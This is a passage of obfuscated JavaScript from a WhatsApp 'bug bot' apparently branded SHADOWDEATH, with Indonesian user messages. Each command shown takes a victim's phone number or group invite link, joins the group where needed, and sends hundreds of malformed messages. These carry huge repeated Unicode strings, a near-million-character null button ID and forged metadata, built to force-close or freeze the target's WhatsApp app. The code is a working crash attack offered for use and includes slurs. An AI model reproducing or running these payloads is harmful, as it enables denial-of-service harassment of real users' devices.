                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Penggunaan " + ('.' + _0x4345b8) + " 628xxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x463f5f = q.replace(/[^0-9]/g, '');
          if (_0x463f5f.startsWith('0')) {
            return reply("Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + ('.' + _0x4345b8) + " 628xxx");
          }
          let _0x3784ff = _0x463f5f + "@s.whatsapp.net";
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': "╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣\n┃ 𝐓𝐲𝐩𝐞 : xvshadow [ 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 ]\n┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : " + _0x463f5f + "\n┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊\n┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.\n╰━━━━━━━━━━━━━━━━━⬣",
            'gifPlayback': true
          }, {
            'quoted': _0x2f6673
          });
          for (let _0x313c08 = 0x0; _0x313c08 < 0xa; _0x313c08++) {
            await _0x2bc7bb(_0x3784ff);
            await _0x2bc7bb(_0x3784ff);
            await _0x4a5bda(_0x3784ff);
          }
          await _0x2bc7bb(_0x3784ff);
          await _0x2bc7bb(_0x3784ff);
          await _0x4a5bda(_0x3784ff);
        }
        break;
      case 'invis-vx':
        {
          if (!isOwner && !_0x329cc3) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Fitur Bug Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Penggunaan " + ('.' + _0x4345b8) + " 628xxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x46ecbb = q.replace(/[^0-9]/g, '');
          if (_0x46ecbb.startsWith('0')) {
            return reply("Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + ('.' + _0x4345b8) + " 628xxx");
          }
          let _0x183940 = _0x46ecbb + "@s.whatsapp.net";
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': "╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣\n┃ 𝐓𝐲𝐩𝐞 : invis-vx [ 𝐃𝐞𝐥𝐚𝐲 ]\n┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : " + _0x46ecbb + "\n┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊\n┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.\n╰━━━━━━━━━━━━━━━━━⬣",
            'gifPlayback': true
          }, {
            'quoted': _0x2f6673
          });
          for (let _0x386a33 = 0x0; _0x386a33 < 0x12c; _0x386a33++) {
            await _0x4fe54c(_0x183940);
            await _0x4a5bda(_0x183940);
            await _0xa8e712(_0x183940);
            await _0x3eda37(_0x183940);
            await {
              'viewOnceMessage': {
                'message': {
                  'listResponseMessage': {
                    'title': "PL TESTING" + "ê¦½".repeat(0xafc8),
                    'listType': 0x2,
                    'singleSelectReply': {
                      'selectedRowId': "ðŸ©¸"
                    },
                    'contextInfo': {
                      'stanzaId': crypto.randomBytes(0x10).toString("hex"),
                      'participant': "0@s.whatsapp.net",
                      'remoteJid': "status@broadcast",
                      'mentionedJid': [_0x183940],
                      'quotedMessage': {
                        'buttonsMessage': {
                          'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            'fileSha256': '+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=',
                            'fileLength': '9999999999999',
                            'pageCount': 0xd4a50fff,
                            'mediaKey': "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                            'fileName': 'PL',
                            'fileEncSha256': "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                            'directPath': '/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0',
                            'mediaKeyTimestamp': "1735456100",
                            'contactVcard': true,
                            'caption': "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                          },
                          'contentText': "à¼‘ Fail Beta - ( devorsixcore ) \"ðŸ‘‹\"",
                          'footerText': "Â© running since 2020 to 20##?",
                          'buttons': [{
                            'buttonId': "\0".repeat(0xdbba0),
                            'buttonText': {
                              'displayText': "ðŽŸ ð“ðâ€Œð— â¿» ð‚â€Œð‹ð¢ðšµâ€Œðð“â€Œ ðŽŸ"
                            },
                            'type': 0x1
                          }],
                          'headerType': 0x3
                        }
                      },
                      'conversionSource': "porn",
                      'conversionData': crypto.randomBytes(0x10),
                      'conversionDelaySeconds': 0x270f,
                      'forwardingScore': 0xf423f,
                      'isForwarded': true,
                      'quotedAd': {
                        'advertiserName': " x ",
                        'mediaType': "IMAGE",
                        'jpegThumbnail': null,
                        'caption': " x "
                      },
                      'placeholderKey': {
                        'remoteJid': "0@s.whatsapp.net",
                        'fromMe': false,
                        'id': "ABCDEF1234567890"
                      },
                      'expiration': -0x1869f,
                      'ephemeralSettingTimestamp': Date.now(),
                      'ephemeralSharedSecret': crypto.randomBytes(0x10),
                      'entryPointConversionSource': "kontols",
                      'entryPointConversionApp': 'kontols',
                      'actionLink': {
                        'url': "t.me/jackthexbec",
                        'buttonTitle': "konstol"
                      },
                      'disappearingMode': {
                        'initiator': 0x1,
                        'trigger': 0x2,
                        'initiatorDeviceJid': _0x183940,
                        'initiatedByMe': true
                      },
                      'groupSubject': "kontol",
                      'parentGroupJid': "kontolll",
                      'trustBannerType': "kontol",
                      'trustBannerAction': 0x1869f,
                      'isSampled': true,
                      'externalAdReply': {
                        'title': 'Î›Æ§Î‰BÓ¨Ð¯ÐŸ',
                        'mediaType': 0x2,
                        'renderLargerThumbnail': false,
                        'showAdAttribution': false,
                        'containsAutoReply': false,
                        'body': "IÆ§ Î›á„‚IVÎ£",
                        'thumbnail': null,
                        'sourceUrl': "go fuck yourself",
                        'sourceId': "dvx - problem",
                        'ctwaClid': "cta",
                        'ref': "ref",
                        'clickToWhatsappCall': true,
                        'automatedGreetingMessageShown': false,
                        'greetingMessageBody': 'kontol',
                        'ctaPayload': "cta",
                        'disableNudge': true,
                        'originalImageUrl': "konstol"
                      },
                      'featureEligibilities': {
                        'cannotBeReactedTo': true,
                        'cannotBeRanked': true,
                        'canRequestFeedback': true
                      },
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': '120363274419384848@newsletter',
                        'serverMessageId': 0x1,
                        'newsletterName': "TrashDex ð–£‚      - ã€½" + "ê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆ".repeat(0xa),
                        'contentType': 0x3,
                        'accessibilityText': "kontol"
                      },
                      'statusAttributionType': 0x2,
                      'utm': {
                        'utmSource': 'utm',
                        'utmCampaign': "utm2"
                      }
                    },
                    'description': "PL TESTING"
                  },
                  'messageContextInfo': {
                    'messageSecret': crypto.randomBytes(0x20),
                    'supportPayload': JSON.stringify({
                      'version': 0x2,
                      'is_ai_message': true,
                      'should_show_system_message': true,
                      'ticket_id': crypto.randomBytes(0x10)
                    })
                  }
                }
              }
            };
            await _0x27e6f4(_0x183940);
            await _0x4fe54c(_0x183940);
          }
          await _0x4fe54c(_0x183940);
          await _0x4a5bda(_0x183940);
          await _0xa8e712(_0x183940);
          await _0x4458d2(_0x183940);
          await _0x27e6f4(_0x183940);
          await _0x4fe54c(_0x183940);
        }
        break;
      case "invis-shadow":
        {
          if (!isOwner && !_0x329cc3) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Fitur Bug Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Penggunaan " + ('.' + _0x4345b8) + " 628xxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x171098 = q.replace(/[^0-9]/g, '');
          if (_0x171098.startsWith('0')) {
            return reply("Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + ('.' + _0x4345b8) + " 628xxx");
          }
          let _0x49d3f9 = _0x171098 + '@s.whatsapp.net';
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': "╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣\n┃ 𝐓𝐲𝐩𝐞 : invis-shadow [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]\n┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : " + _0x171098 + "\n┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊\n┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.\n╰━━━━━━━━━━━━━━━━━⬣",
            'gifPlayback': true
          }, {
            'quoted': _0x2f6673
          });
          for (let _0x3166ff = 0x0; _0x3166ff < 0x1f4; _0x3166ff++) {
            await _0x4fe54c(_0x49d3f9);
            await _0x4a5bda(_0x49d3f9);
            await _0xa8e712(_0x49d3f9);
            await _0x3eda37(_0x49d3f9);
            await _0xd6c38a(_0x49d3f9);
            await _0x27e6f4(_0x49d3f9);
            await _0x4fe54c(_0x49d3f9);
          }
          await _0x4fe54c(_0x49d3f9);
          await _0x4a5bda(_0x49d3f9);
          await _0xa8e712(_0x49d3f9);
          await _0x27e6f4(_0x49d3f9);
        }
      case "death-group":
        {
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Khusus Bug Grup!!!",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.chat) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "*Can only be used in bot numbers*",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "*Succes*",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          {
            await _0xa8e712(_0x2f6673.chat);
            await _0x4a5bda(_0x2f6673.chat);
            await {
              'viewOnceMessage': {
                'message': {
                  'listResponseMessage': {
                    'title': "PL TESTING" + "ê¦½".repeat(0xafc8),
                    'listType': 0x2,
                    'singleSelectReply': {
                      'selectedRowId': "ðŸ©¸"
                    },
                    'contextInfo': {
                      'stanzaId': crypto.randomBytes(0x10).toString("hex"),
                      'participant': "0@s.whatsapp.net",
                      'remoteJid': "status@broadcast",
                      'mentionedJid': [_0x2f6673.chat],
                      'quotedMessage': {
                        'buttonsMessage': {
                          'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            'fileSha256': '+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=',
                            'fileLength': '9999999999999',
                            'pageCount': 0xd4a50fff,
                            'mediaKey': "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                            'fileName': 'PL',
                            'fileEncSha256': "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                            'directPath': '/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0',
                            'mediaKeyTimestamp': "1735456100",
                            'contactVcard': true,
                            'caption': "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                          },
                          'contentText': "à¼‘ Fail Beta - ( devorsixcore ) \"ðŸ‘‹\"",
                          'footerText': "Â© running since 2020 to 20##?",
                          'buttons': [{
                            'buttonId': "\0".repeat(0xdbba0),
                            'buttonText': {
                              'displayText': "ðŽŸ ð“ðâ€Œð— â¿» ð‚â€Œð‹ð¢ðšµâ€Œðð“â€Œ ðŽŸ"
                            },
                            'type': 0x1
                          }],
                          'headerType': 0x3
                        }
                      },
                      'conversionSource': "porn",
                      'conversionData': crypto.randomBytes(0x10),
                      'conversionDelaySeconds': 0x270f,
                      'forwardingScore': 0xf423f,
                      'isForwarded': true,
                      'quotedAd': {
                        'advertiserName': " x ",
                        'mediaType': "IMAGE",
                        'jpegThumbnail': null,
                        'caption': " x "
                      },
                      'placeholderKey': {
                        'remoteJid': "0@s.whatsapp.net",
                        'fromMe': false,
                        'id': "ABCDEF1234567890"
                      },
                      'expiration': -0x1869f,
                      'ephemeralSettingTimestamp': Date.now(),
                      'ephemeralSharedSecret': crypto.randomBytes(0x10),
                      'entryPointConversionSource': "kontols",
                      'entryPointConversionApp': 'kontols',
                      'actionLink': {
                        'url': "t.me/jackthexbec",
                        'buttonTitle': "konstol"
                      },
                      'disappearingMode': {
                        'initiator': 0x1,
                        'trigger': 0x2,
                        'initiatorDeviceJid': _0x2f6673.chat,
                        'initiatedByMe': true
                      },
                      'groupSubject': "kontol",
                      'parentGroupJid': "kontolll",
                      'trustBannerType': "kontol",
                      'trustBannerAction': 0x1869f,
                      'isSampled': true,
                      'externalAdReply': {
                        'title': 'Î›Æ§Î‰BÓ¨Ð¯ÐŸ',
                        'mediaType': 0x2,
                        'renderLargerThumbnail': false,
                        'showAdAttribution': false,
                        'containsAutoReply': false,
                        'body': "IÆ§ Î›á„‚IVÎ£",
                        'thumbnail': null,
                        'sourceUrl': "go fuck yourself",
                        'sourceId': "dvx - problem",
                        'ctwaClid': "cta",
                        'ref': "ref",
                        'clickToWhatsappCall': true,
                        'automatedGreetingMessageShown': false,
                        'greetingMessageBody': 'kontol',
                        'ctaPayload': "cta",
                        'disableNudge': true,
                        'originalImageUrl': "konstol"
                      },
                      'featureEligibilities': {
                        'cannotBeReactedTo': true,
                        'cannotBeRanked': true,
                        'canRequestFeedback': true
                      },
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': '120363274419384848@newsletter',
                        'serverMessageId': 0x1,
                        'newsletterName': "TrashDex ð–£‚      - ã€½" + "ê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆ".repeat(0xa),
                        'contentType': 0x3,
                        'accessibilityText': "kontol"
                      },
                      'statusAttributionType': 0x2,
                      'utm': {
                        'utmSource': 'utm',
                        'utmCampaign': "utm2"
                      }
                    },
                    'description': "PL TESTING"
                  },
                  'messageContextInfo': {
                    'messageSecret': crypto.randomBytes(0x20),
                    'supportPayload': JSON.stringify({
                      'version': 0x2,
                      'is_ai_message': true,
                      'should_show_system_message': true,
                      'ticket_id': crypto.randomBytes(0x10)
                    })
                  }
                }
              }
            };
            await _0xd6c38a(_0x2f6673.chat);
            await _0x486d4f(_0x2f6673.chat);
            await _0x27e6f4(_0x2f6673.chat);
          }
        }
        break;
      case "shadow-deathgroup":
        {
          if (!_0x329cc3 && !isOwner && !isUnli) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("*Example:*\n" + ('.' + _0x4345b8) + " https:// Atau 9741@g.us"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0xe89bf3 = _0x3e49e9[0x0];
          let _0x4146c3;
          if (_0xe89bf3.includes("https://chat.whatsapp.com/")) {
            _0x4146c3 = _0xe89bf3.split("https://chat.whatsapp.com/")[0x1];
            if (!_0x4146c3) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "invalid group link",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            try {
              let _0x28c33d = await _0x47285b.groupAcceptInvite(_0x4146c3);
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0xe89bf3 + " (Group ID: " + _0x4146c3 + ')'),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
              for (let _0x1004cd = 0x0; _0x1004cd < 0x12c; _0x1004cd++) {
                await _0x3e7389(_0x28c33d);
                await _0x3e7389(_0x28c33d);
                await _0x3e7389(_0x28c33d);
                await _0x3e7389(_0x28c33d);
              }
            } catch (_0x552365) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          } else {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0xe89bf3),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
            for (let _0x5f12fa = 0x0; _0x5f12fa < 0x12c; _0x5f12fa++) {
              await _0x52fe39(_0xe89bf3);
              await _0x3e7389(_0xe89bf3);
              await _0x3e7389(_0xe89bf3);
              await _0x52fe39(_0xe89bf3);
            }
          }
        }
        break;
      case "shadow-delay":
        {
          if (!_0x329cc3 && !isOwner && !isUnli) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("*Example:*\n" + ('.' + _0x4345b8) + " https:// Atau 9741@g.us"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x5e813d = _0x3e49e9[0x0];
          let _0x4a1f7a;
          if (_0x5e813d.includes('https://chat.whatsapp.com/')) {
            _0x4a1f7a = _0x5e813d.split('https://chat.whatsapp.com/')[0x1];
            if (!_0x4a1f7a) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "invalid group link",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            try {
              let _0x2bb5da = await _0x47285b.groupAcceptInvite(_0x4a1f7a);
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0x5e813d + " (Group ID: " + _0x4a1f7a + ')'),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
              for (let _0x49848d = 0x0; _0x49848d < 0x12c; _0x49848d++) {
                await _0x469aaf(_0x2bb5da);
                await _0x469aaf(_0x2bb5da);
                await _0x469aaf(_0x2bb5da);
                await _0x469aaf(_0x2bb5da);
              }
            } catch (_0x98a5e5) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          } else {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0x5e813d),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
            for (let _0x408726 = 0x0; _0x408726 < 0x12c; _0x408726++) {
              await _0x469aaf(_0x5e813d);
              await _0x3e7389(_0x5e813d);
              await _0x469aaf(_0x5e813d);
              await _0x3e7389(_0x5e813d);
            }
          }
        }
        break;
        async function _0x14367e(_0x16407e) {
          try {
            await _0x47285b.offerCall(_0x16407e, {
              'video': true
            });
            console.log(chalk.white.bold("Success Send Offer Video Call To Target"));
          } catch (_0x1cadec) {
            console.error(chalk.white.bold("Failed Send Offer Video Call To Target:", _0x1cadec));
          }
        }
      case "brutalspam":
      case "shadowspam":
        {
          if (!isOwner && !_0x329cc3 && !isUnli) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Fitur ini Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Penggunaan " + ('.' + _0x4345b8) + " 628xxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          } else {
            let _0x4e6f93 = q.replace(/[^0-9]/g, '');
            if (_0x4e6f93.startsWith('0')) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
